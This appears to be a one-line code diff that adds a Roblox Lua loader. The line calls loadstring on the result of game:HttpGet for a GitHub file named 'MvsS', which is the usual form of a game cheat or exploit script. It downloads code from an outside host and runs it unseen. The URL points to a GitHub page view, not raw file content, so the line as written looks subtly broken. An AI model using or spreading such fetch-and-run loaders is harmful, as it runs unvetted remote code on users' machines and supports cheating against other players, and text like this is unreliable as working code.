@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://github.com/DrakainnnDL/Script/blob/main/MvsS'))()
